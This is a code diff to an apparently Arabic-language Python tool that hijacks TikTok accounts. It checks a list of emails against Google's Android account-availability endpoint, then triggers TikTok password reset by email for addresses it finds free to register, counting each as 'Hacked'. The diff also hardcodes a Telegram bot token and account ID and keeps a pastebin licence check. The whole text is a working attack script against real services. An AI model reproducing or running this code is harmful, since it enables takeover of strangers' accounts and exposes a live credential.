@@ -3,6 +3,8 @@ import json
 import random
 import time
 import os
+
+import os 
 a = 0
 r =0
 rr=0
@@ -16,7 +18,7 @@ m =0
 n = 0
 s = 0
 b = 0
-id2  = ('121212ssss')
+id2  = ('zaidk')
 urlp = requests.get('https://pastebin.com/Lb2PH728').text
 if id2 in urlp:
     os.system('cls'if os.name=='nt'else'clear')
@@ -40,9 +42,12 @@ else:
 
 
 os.system('cls' if os.name=='nt'else'clear')
+
+
+
 def gmail():
-    took = input('Enter Your ToKEN  Bot : ')   
-    idddd = input('Enter Your ID Accouint : ')
+    took = '5255006158:AAGlGvZHw6DC1c6sTf7IRwXQu0EzJfG1FMg'
+    idddd = '1548932732'
 
 
     
@@ -53,20 +58,33 @@ def gmail():
         print('Error File')
         exit()
     for email in file:
-        try:
+        
             
-            url0 = f'https://ffnzz.scriptfree.repl.co/api-Checker-Gmail/?email={email}'
-            xb = requests.get(url0).text
-        except requests.exceptions.SSLError as error:
-            print('Error')
+        url0 = f'https://android.clients.google.com/setup/checkavail'
+        headers = {
+            'Content-Length':'98',
+            'Content-Type':'text/plain; charset=UTF-8',
+            'Host':'android.clients.google.com',
+            'Connection':'Keep-Alive',
+            'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',}
+        data= json.dumps({
+            'username':email,
+            'version':'3',
+            'firstName':'AbaLahb',
+            'lastName':'AbuJahl'})
+        try:
+            res=requests.post(url0,headers=headers,data=data)
+        except requests.exceptions.ConnectionError as error:
             continue
+            
+            
         
       
-        if ('"status":"BAD"') in xb:
+        if res.json()['status'] =='USERNAME_UNAVAILABLE':
             p+=1
             os.system('cls' if os.name =='nt'else'clear')
             print(f'[=] - Hacked : {a}\n[=] - Bad Gmail : {p}\n[=] - Bad Tiktok : {m}\n[=] - Py : [MVMVP - FFNZZ]\n')
-        elif ('"status":"GOD"') in xb:
+        elif res.json()['status'] =='SUCCESS':
         
             url = "https://api2-19-h2.musical.ly/aweme/v1/passport/find-password-via-email/?app_language=ar&manifest_version_code=2018101933&_rticket=1656747775754&iid=7115676682581247750&channel=googleplay&language=ar&fp=&device_type=SM-A022F&resolution=720*1471&openudid=8c05dec470c7b7d5&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=280&carrier_region=IQ&ac=wifi&device_id=7023349253125604869&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=samsung&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233&ts=1656747775&as=a1e67fbb4fffb246cf0244&cp=f2f02d6bfbffb36de1eomw&mas=01cd120efcb179ac1b331e5cecb80282052c2c4c0c66c66c2c4c46"
             headers = {
@@ -125,6 +143,10 @@ def gmail():
                     
                 
             elif ('"Bind device by email failed"') in ree:
+                m+=1
+                os.system('cls' if os.name =='nt'else'clear')
+                print(f'[=] - Hacked : {a}\n[=] - Bad Gmail : {p}\n[=] - Bad Tiktok : {m}\n[=] - Py : [MVMVP - FFNZZ]\n')
+            else:
                 m+=1
                 os.system('cls' if os.name =='nt'else'clear')
                 print(f'[=] - Hacked : {a}\n[=] - Bad Gmail : {p}\n[=] - Bad Tiktok : {m}\n[=] - Py : [MVMVP - FFNZZ]\n')
@@ -214,8 +236,7 @@ def fol2():
         
         
         
-    
-    
+
     
     
 def fol():
@@ -384,7 +405,7 @@ try:
     elif inp ==2:
         fol2()
     elif inp == 3:
-        ok()
+        False
     elif inp==4:
         gmail()
 
